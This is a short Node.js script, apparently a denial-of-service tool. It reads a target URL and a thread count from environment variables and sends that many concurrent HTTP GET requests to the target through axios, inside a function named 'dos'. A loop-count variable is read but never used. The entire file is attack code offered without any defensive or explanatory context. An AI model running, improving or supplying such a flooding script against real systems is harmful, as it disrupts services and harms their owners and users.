require("dotenv").config();
const target = `${process.env.target}`;

const threads = parseInt(process.env.THREAD);
const loops = parseInt(process.env.LOOPS);
const axios = require("axios");
function dos(target) {
    for (let i =0;i<threads;i++) {
        axios.get(target,{timeout:1000*120}).then((value) => {
            console.log("success");
        }).catch((error) => {
            console.log("Error");
        });
    }
}
dos(target);